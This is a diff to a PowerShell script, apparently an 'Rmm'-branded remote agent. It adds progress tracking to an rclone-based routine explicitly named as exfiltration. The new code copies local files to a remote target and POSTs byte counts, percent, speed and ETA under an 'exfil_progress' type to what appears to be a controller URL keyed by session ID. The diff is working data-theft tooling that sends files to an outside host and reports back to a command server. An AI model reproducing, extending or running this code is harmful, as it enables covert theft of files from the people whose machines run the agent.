@@ -950,6 +950,177 @@ function Send-RmmCloudUploadResult {
     Invoke-RmmRestMethod -Uri $resultUrl -Method Post -Body $json -ContentType 'application/json; charset=utf-8' -Headers $Headers -RestErrorAction Stop | Out-Null
 }
 
+function Send-RmmExfilProgressResult {
+    param(
+        [hashtable]$Payload,
+        [hashtable]$Headers = @{}
+    )
+    $json = $Payload | ConvertTo-Json -Compress -Depth 8
+    $resultUrl = "$u/result?id=$sessionId&type=exfil_progress"
+    try {
+        Invoke-RmmRestMethod -Uri $resultUrl -Method Post -Body $json -ContentType 'application/json; charset=utf-8' -Headers $Headers -RestErrorAction SilentlyContinue | Out-Null
+    } catch {
+        Write-RmmLog "Exfil progress POST failed: $($_.Exception.Message)" -Level DEBUG
+    }
+}
+
+function Format-RmmByteSize {
+    param([long]$Bytes)
+    if ($Bytes -lt 0) { return '0 B' }
+    if ($Bytes -lt 1024) { return "$Bytes B" }
+    if ($Bytes -lt 1MB) { return ('{0:N1} KB' -f ($Bytes / 1KB)) }
+    if ($Bytes -lt 1GB) { return ('{0:N1} MB' -f ($Bytes / 1MB)) }
+    return ('{0:N2} GB' -f ($Bytes / 1GB))
+}
+
+function Format-RmmDuration {
+    param([double]$Seconds)
+    if ($Seconds -lt 0 -or [double]::IsNaN($Seconds) -or [double]::IsInfinity($Seconds)) { return '?' }
+    $s = [int][math]::Round($Seconds)
+    if ($s -lt 60) { return "${s}s" }
+    if ($s -lt 3600) { return ('{0}m {1}s' -f ([math]::Floor($s / 60)), ($s % 60)) }
+    return ('{0}h {1}m' -f ([math]::Floor($s / 3600)), ([math]::Floor(($s % 3600) / 60)))
+}
+
+function Send-RmmExfilProgressIfChanged {
+    param(
+        [hashtable]$Context,
+        [hashtable]$Headers,
+        [long]$Bytes,
+        [long]$TotalBytes,
+        [double]$Speed,
+        [double]$Eta,
+        [ref]$LastSentPct,
+        [ref]$LastSentAt
+    )
+    if ($TotalBytes -le 0) { return }
+    $pct = [math]::Min(100.0, [math]::Max(0.0, ($Bytes * 100.0 / $TotalBytes)))
+    $now = [DateTime]::UtcNow
+    $elapsed = ($now - $LastSentAt.Value).TotalSeconds
+    if ($pct - $LastSentPct.Value -lt 1.0 -and $elapsed -lt 10 -and $pct -lt 100) { return }
+
+    $LastSentPct.Value = $pct
+    $LastSentAt.Value = $now
+    $speedBps = [long][math]::Max(0, [math]::Round($Speed))
+    $etaSec = if ($Eta -ge 0) { [int][math]::Round($Eta) } else { -1 }
+
+    Send-RmmExfilProgressResult -Payload @{
+        remote_path = [string]$Context.remote_path
+        profile     = [string]$Context.profile
+        bytes       = $Bytes
+        total_bytes = $TotalBytes
+        percent     = [math]::Round($pct, 1)
+        speed_bps   = $speedBps
+        eta_seconds = $etaSec
+    } -Headers $Headers
+
+    $msg = ('Exfil {0:N1}% ({1} / {2}, {3}/s, ETA {4})' -f $pct, (Format-RmmByteSize $Bytes), (Format-RmmByteSize $TotalBytes), (Format-RmmByteSize $speedBps), (Format-RmmDuration $Eta))
+    Write-Host "[*] $msg" -ForegroundColor Cyan
+}
+
+function Read-RmmRcloneJsonLogProgress {
+    param(
+        [string]$LogPath,
+        [ref]$ReadOffset,
+        [hashtable]$Context,
+        [hashtable]$Headers,
+        [ref]$LastSentPct,
+        [ref]$LastSentAt
+    )
+    if (-not (Test-Path -LiteralPath $LogPath)) { return }
+    $fs = $null
+    try {
+        $fs = [System.IO.File]::Open($LogPath, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
+        if ($ReadOffset.Value -gt $fs.Length) { $ReadOffset.Value = 0 }
+        $fs.Seek($ReadOffset.Value, [System.IO.SeekOrigin]::Begin) | Out-Null
+        $sr = New-Object System.IO.StreamReader($fs)
+        while (-not $sr.EndOfStream) {
+            $line = $sr.ReadLine()
+            if ([string]::IsNullOrWhiteSpace($line)) { continue }
+            try {
+                $obj = $line | ConvertFrom-Json
+            } catch {
+                continue
+            }
+            $stats = $null
+            if ($obj.PSObject.Properties['stats']) {
+                $stats = $obj.stats
+            }
+            if (-not $stats) { continue }
+            $bytes = [long]$stats.bytes
+            $total = [long]$stats.totalBytes
+            $speed = [double]$stats.speed
+            $eta = [double]$stats.eta
+            Send-RmmExfilProgressIfChanged -Context $Context -Headers $Headers -Bytes $bytes -TotalBytes $total `
+                -Speed $speed -Eta $eta -LastSentPct $LastSentPct -LastSentAt $LastSentAt
+        }
+        $ReadOffset.Value = $fs.Position
+    } finally {
+        if ($fs) { $fs.Close() }
+    }
+}
+
+function Invoke-RmmRcloneCopytoWithProgress {
+    param(
+        [Parameter(Mandatory = $true)][string]$RclonePath,
+        [Parameter(Mandatory = $true)][string]$LocalPath,
+        [Parameter(Mandatory = $true)][string]$RemoteTarget,
+        [Parameter(Mandatory = $true)][hashtable]$Context,
+        [hashtable]$Headers = @{}
+    )
+    $logFile = [System.IO.Path]::GetTempFileName()
+    $lastSentPct = -1.0
+    $lastSentAt = [DateTime]::MinValue
+    $readOffset = 0
+    try {
+        $argList = @(
+            'copyto', $LocalPath, $RemoteTarget,
+            '--config', 'NUL',
+            '--retries', '3',
+            '--use-json-log',
+            '--stats', '5s',
+            '--stats-log-level', 'NOTICE',
+            '--log-file', $logFile
+        )
+        Write-RmmLog "rclone copyto (progress) $LocalPath -> $RemoteTarget" -Level DEBUG
+        $totalBytes = [long]$Context.total_bytes
+        if ($totalBytes -gt 0) {
+            Send-RmmExfilProgressResult -Payload @{
+                remote_path = [string]$Context.remote_path
+                profile     = [string]$Context.profile
+                bytes       = 0
+                total_bytes = $totalBytes
+                percent     = 0
+                speed_bps   = 0
+                eta_seconds = -1
+            } -Headers $Headers
+            Write-Host "[*] Exfil starting ($(Format-RmmByteSize $totalBytes))…" -ForegroundColor Cyan
+        }
+        $proc = Start-Process -FilePath $RclonePath -ArgumentList $argList -NoNewWindow -PassThru
+        if (-not $proc) {
+            throw 'Failed to start rclone copyto'
+        }
+        while (-not $proc.HasExited) {
+            Start-Sleep -Milliseconds 800
+            Read-RmmRcloneJsonLogProgress -LogPath $logFile -ReadOffset ([ref]$readOffset) -Context $Context `
+                -Headers $Headers -LastSentPct ([ref]$lastSentPct) -LastSentAt ([ref]$lastSentAt)
+        }
+        Read-RmmRcloneJsonLogProgress -LogPath $logFile -ReadOffset ([ref]$readOffset) -Context $Context `
+            -Headers $Headers -LastSentPct ([ref]$lastSentPct) -LastSentAt ([ref]$lastSentAt)
+        $proc.WaitForExit()
+        if ($proc.ExitCode -ne 0) {
+            $detail = ''
+            if (Test-Path -LiteralPath $logFile) {
+                $detail = (Get-Content -LiteralPath $logFile -Raw -ErrorAction SilentlyContinue).Trim()
+                if ($detail.Length -gt 500) { $detail = $detail.Substring($detail.Length - 500) }
+            }
+            throw "rclone copyto failed (exit $($proc.ExitCode)): $detail"
+        }
+    } finally {
+        Remove-Item -LiteralPath $logFile -Force -ErrorAction SilentlyContinue
+    }
+}
+
 function Invoke-RmmRcloneExfil {
     param(
         [Parameter(Mandatory = $true)][string]$CommandLine,
@@ -1017,14 +1188,16 @@ function Invoke-RmmRcloneExfil {
         }
     }
 
+    $progressContext = @{
+        remote_path = $localPath
+        profile     = [string]$job.profile
+        total_bytes = [long]$fileInfo.Length
+    }
+
     try {
         Write-RmmLog "rclone copyto $localPath -> $remoteTarget ($($fileInfo.Length) bytes)" -Level DEBUG
-        $copyOut = & $rclonePath copyto $localPath $remoteTarget --config NUL --retries 3 2>&1
-        if ($LASTEXITCODE -ne 0) {
-            $detail = ($copyOut | Out-String).Trim()
-            if ($detail.Length -gt 500) { $detail = $detail.Substring(0, 500) }
-            throw "rclone copyto failed (exit $LASTEXITCODE): $detail"
-        }
+        Invoke-RmmRcloneCopytoWithProgress -RclonePath $rclonePath -LocalPath $localPath -RemoteTarget $remoteTarget `
+            -Context $progressContext -Headers $Headers
 
         $link = $null
         if ($job.link_command) {
